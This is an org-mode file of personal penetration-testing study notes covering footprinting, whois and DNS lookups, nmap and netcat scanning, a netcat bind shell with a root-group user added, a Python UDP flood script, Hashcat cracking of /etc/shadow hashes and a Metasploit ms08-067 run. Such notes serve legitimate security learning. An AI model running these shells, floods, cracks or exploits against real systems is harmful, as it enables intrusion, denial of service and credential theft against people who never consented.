#+HTML_HEAD: <link rel="stylesheet" type="text/css" href="css/main.css" />
* footpringint
** website footprinting
 - operating system used.
 - subdirectories and parameters
 - Filename, path, database field name, or query:You should analyze anything after the
   a  query that looks like a filename, path, database field name, or query carefully
   to check whether it offers opportunities for SQL injection
 - Scripting platform
 - Contact details and CMS details: The contact pages usually offer details such as names
   phone numbers, email addresses, and locations of admin or support people.

** view headers
 - Connection status and content-type
 - Accept-ranges
 - Last-Modified information
 - X-Powered-By information
 - Web server in use and its version

** examine cookies set by the server to determine the software
running and its behavior.

** Email footprinting
By using email tracking tools you can gather the following information about
the victim:

 - Geolocation
 - read duration
 - proxy detection
 - links : allows you to check whether the links sent to the recipient through email
   have been checked or not.
 - Operating System
 - Forward email : whether or not the email sent to you is forwarded to another person
   can be determined easily by using this tool.

* Kali linux prep
** install linux headers for kali

#+begin_src shell 
$ apt-cache search header | grep -i linux
#  look for the one ending in –kali-all-amd64
$ apt-get install linux-headers-4.4.0-kalli-all-amd64
#+end_src 

** install kali guest additions

#+begin_src shell 
$ cd /media/cdrom0
$ cp VBoxLinuxAdditions.run /root/Desktop
$ ./VBoxLinuxAdditions.run
#+end_src 

** use network managed mode

#+begin_src shell 
$ vim /etc/NetworkManager.conf
# change managed=false to managed=true
#+end_src 

** permit =Root= login for SSH

#+begin_src shell 
$ vim /etc/ssh/sshd_config
#  change line PermitRootLogin without-password
#  PermitRootLogin yes
#+end_src 

* google search operators
|            |                                                                                                |
|------------+------------------------------------------------------------------------------------------------|
| Operator   | Description intitle Looks for the search terms in the title                                    |
| allintitle | Looks for the search terms only in the title and nowhere else in the document                  |
| inurl      | Looks through the URL (the address) for the search terms                                       |
| allinurl   | Similar to allintitle     looks only in the URL for the search terms                           |
| filetype   | You provide the filetype and search terms. All results have that filetype.                     |
| allintext  | The search will not look at the URL and just in the text.                                      |
| site       | Narrow your search to a particular site. You have to provide the site as well as search terms. |
| link       | Searches for links to pages                                                                    |
| inanchor   | This search will look in anchor tags only                                                      |
| numrange   | Searches for a number                                                                          |
| daterange  | Results will be within a range of dates            as specified                                |
| author     | Searches Google Groups for a particular author. This only works in Google Groups.              |
| group      | Looks for a group name. This only works in Google Groups.                                      |
| insubject  | Searches subject lines in posts. This only works in Google Groups.                             |
| msgid      | Searches within a group for a message ID.                                                      |

http://www.googleguide.com
* whois & DNS
** query
#+begin_src shell
$ whois apress.com
$ whois -h whois.apnic.net <host>
# Looking up all the whois records that are maintained by the
# folks from Yahoo!. The following command shows how you do this:
$ whois –i mnt-by YAHOO-MNT
# filter ip addresses
$ whois –i mnt-by YAHOO-MNT | grep inetnum
$ whois –i mnt-by YAHOO-MNT | grep inetnum | awk –F\: '{ print $2 }'
#+end_src 

** whois query query handler

| whois.nic.ir    |
| whois.apnic.net |
| whois.arin.net  |

** MX record

Every domain will have at least one MX record. Knowing the hostname from the MX
record will tell you which system you need to interact with if you want to
perform penetration testing against the organization's receiving mail server
using the simple mail transfer protocol (SMTP) .

#+begin_src shell
# MX records
$ dig Mx apress.com
#using nslookup
$ nslookup
> set type=mx
> apress.com
#+end_src

** reverse DNS lookup
#+begin_src shell 
$ dig -x [IP address]
#+end_src 

* port scan 

#+begin_src shell 
# -p- scann all 65536 ports
$ sudo nmap -sS -p- 172.30.42.1
# udp port scan
$ sudo namp -sU
# operating system scan
$ sudo nmap -sS -O 172.30.42.1
# scan one port 
$ sudo nmap -sV -p 22,53 <ip>

#+end_src 

* banner grabbing
use telnet for TCP and nc for UPD connections.

#+begin_src shell 
$ telnet <host> <port>
$ nc -u <host> <port>
#+end_src

* host discovery with =arping=
  
#+begin_src shell 
$ arping [ip address]
#+end_src 

* netcat
** port scan using =netcat= 

 #+begin_src shell 
 $ netcat -z -v domain.com 1-1000
 #ou can then use the -n flag to specify that you do not need to resolve the IP address using DNS:
 $ netcat -z -n -v 111.111.111.111 1-1000
 $ netcat -z -n -v 111.111.111.111 1-1000 2>&1 | grep succeeded
 # to randomized port scanning use -r switch
 $ nc –v –r –w 1 192.168.0.10 –z 1-1000
 # scanning a range of devices
 $ for i in {10..12}; do nc –vv –n –w 1 192.168.0.$i 21-25 –z; done
 #+end_src

** communicate through =netcat=

 On one machine, you can tell netcat to listen to a specific port for
 connections. We can do this by providing the -l parameter and choosing a port:

 #+begin_src shell 
 netcat -l 4444
 #+end_src

 This will tell netcat to listen for TCP connections on port 4444

 On a second server, we can connect to the first machine on the port number we
 choose. We do this the same way we've been establishing connections previously:

 #+begin_src shell 
 netcat domain.com 4444
 #+end_src 

 It will look as if nothing has happened. However, you can now send messages on
 either side of the connection and they will be seen on either end.
** =netcat= chat interface

 #+begin_src shell 
 $ nc -l -p 4444         # host ip 192.168.1.102
 $ nc 192.168.1.102 4444
 #+end_src 

** transfering data with =netcat=

 #+begin_src shell 
 # server +++ -w 30 wait for 30 seconds 
 $ nc –v –w 30 –p 31337 –l < secret.txt
 # client
 $ nc –v –w 2 192.168.0.10 31337 > secret.txt
 #+end_src 

** banner grabbing

 #+begin_src shell 
 $ nc 192.168.1.1 80
 #+end_src 

** Linux remote shell 

 to prepare the listener we will type the following command into the command
 line:

 #+begin_src shell 
 $ sudo nc –lp 31337 –e /bin/bash
 #Connecting to the target
 $ nc 192.168.0.11 31337
 # Adding a local user and placing into the root group
 $ useradd –g root bob
 #+end_src 

* sample python flood scriptf


#+begin_src python
import socket
import random

sock=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes=random._urandom(1024)
ip=raw_input('Target IP:')
port=input('Port:')
sent=0

while 1:
	sock.sendto(bytes,(ip,port))
	print "Sent %s amount of packets to %s at port %s: " % (sent,ip, port)
	sent = sent + 1
#+end_src 

* Cracking Linux Password Hashes with Hashcat 

** Getting Hashcat 2.00

Hashcat updated to 3.00 and it won't run in a virtual machine anymore. The simplest solution is to use the old version.
In a Terminal window, execute these commands:
#+begin_src shell
cd
mkdir hash
cd hash
wget https://hashcat.net/files_legacy/hashcat-2.00.7z
7z e hashcat-2.00.7z
./hashcat-cli32.bin -V
#+end_src 

#+begin_src shell
# get the hash for a username
$ cat /etc/shadow

# Finding the salt value
# The $6$ value indicates a type 6 password hash (SHA-512).
# The characters after $6$, up to the next $,  are the SALT.
$ cat /etc/show
root:$6$QYVo1xui$JS7zZtJ857Ti5nKYjTAcVUKqe.87yZvUXgehw2irI5k.0NzhI8PLkga8pz3uR7b8V.lF9qpxZtACqIBNKM.yB0:17235:0:99999:7:::

# Hash algorithm?
# the hash algorithm is defined in the file /etc/login.defs.
$ grep -A 18 ENCRYPT_METHOD /etc/login.defs

# Making a Hash File
# add the hashed password to a file
# and remove the last part for the above hash value delete everything after the yB0
# and the username 

# make a wordlist
$ curl http://www.scovetta.com/download/500_passwords.txt > 500_passwords.txt
head 500_passwords.txt

# Cracking the Hash
$ ./hashcat-cli32.bin -m 1800 -a 0 -o found1.txt --remove crack1.hash 500_passwords.txt
$ cat found1.txt

# Unix type 6 password hashes (-m 1800)
# Using a dictionary attack (-a 0)
# Putting output in the file found1.txt
# Removing each hash as it is found
# Getting hashes from crack1.hash
# Using the dictionary 500_passwords.txt
#+end_src 

https://samsclass.info/123/proj10/p12-hashcat.htm

* metasploit
** init
   
#+begin_src shell 
$ service postgresql start
$ service metasploit start
$ msfconsole
msf > search ms08-067
msf > info exploit/windows/smb/ms08_067_netapi
msf > use windows/smb/ms08_067_netapi
msf > show options
# setting RHOST
msf > set RHOST 192.168.20.10
msf > exploit
#+end_src 


